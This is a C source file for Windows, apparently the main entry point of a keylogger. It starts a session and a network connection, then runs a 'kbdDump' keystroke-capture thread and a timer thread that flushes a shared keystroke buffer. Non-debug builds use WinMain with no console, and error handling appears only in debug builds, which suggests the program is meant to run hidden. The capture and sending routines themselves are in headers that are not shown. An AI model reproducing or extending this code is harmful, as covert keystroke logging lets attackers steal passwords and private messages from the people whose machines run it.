#include <windows.h>

#include "shared.h"
#include "kbdHandler.h"
#include "timer.h"
#include "connection.h"

#ifndef DEBUG
int __stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    int       nShowCmd
)
#else
int main()
#endif
{
    initSession();
    initConnection();

    while (TRUE)
    {
        // Create Mutex for Synchronization on access to Buffer and Index in kbdDump and handleTimer threads
        Mutex = CreateMutex(NULL, FALSE, NULL);
        if (Mutex == NULL)
        {
#ifdef DEBUG
            handleError("CreateMutex");
#endif
            continue;
        }

        GetSystemTimeAsFileTime(&LastFlush);

        // Create kbdDump Thread
        DWORD kbdDumpTID;
        HANDLE kbdDumpT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kbdDump, 0, 0, &kbdDumpTID);
        if (kbdDumpT == NULL)
        {
#ifdef DEBUG
            handleError("CreateThread");
#endif
            CloseHandle(Mutex);
            continue;
        }

        // Create handleTimer Thread
        DWORD handleTimerTID;
        HANDLE handleTimerT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handleTimer, 0, 0, &handleTimerTID);
        if (handleTimerT == NULL)
        {
#ifdef DEBUG
            handleError("CreateThread");
#endif
            TerminateThread(kbdDumpT, -1);
            CloseHandle(kbdDumpT);
            CloseHandle(Mutex);
            continue;
        }

        // Wait for Threads to Finish
        HANDLE threads[] = { handleTimerT, kbdDumpT };
        WaitForMultipleObjects(2, threads, TRUE, INFINITE);

        // Close Handles for Cleanup
        CloseHandle(handleTimerT);
        CloseHandle(kbdDumpT);
        CloseHandle(Mutex);
        break;
    }
    return 0;
}
